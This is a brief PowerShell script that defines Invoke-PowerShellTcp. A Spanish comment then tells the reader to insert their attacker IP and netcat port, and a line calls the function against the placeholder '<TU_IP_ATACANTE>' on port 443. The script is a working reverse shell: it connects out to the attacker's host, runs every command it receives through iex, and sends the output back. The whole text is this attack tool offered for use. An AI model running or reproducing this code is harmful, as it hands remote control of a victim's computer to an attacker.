function Invoke-PowerShellTcp 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")]
    Param(
        [Parameter(ParameterSetName="reverse", Mandatory=$true)]
        [String]$IPAddress,

        [Parameter(ParameterSetName="reverse", Mandatory=$true)]
        [Int]$Port
    )

    Process 
    {
        $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}
        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
            $sendback = (iex $data 2>&1 | Out-String )
            $sendback2  = $sendback + "PS " + (pwd).Path + "> "
            $x = ($byte = [text.encoding]::ASCII.GetBytes($sendback2))
            $stream.Write($byte,0,$byte.Length)
            $stream.Flush()
        }
        $client.Close()
    }
}

# Llamada autoejecutable (ajusta con tu IP y puerto de netcat) [5]
Invoke-PowerShellTcp -Reverse -IPAddress <TU_IP_ATACANTE> -Port 443
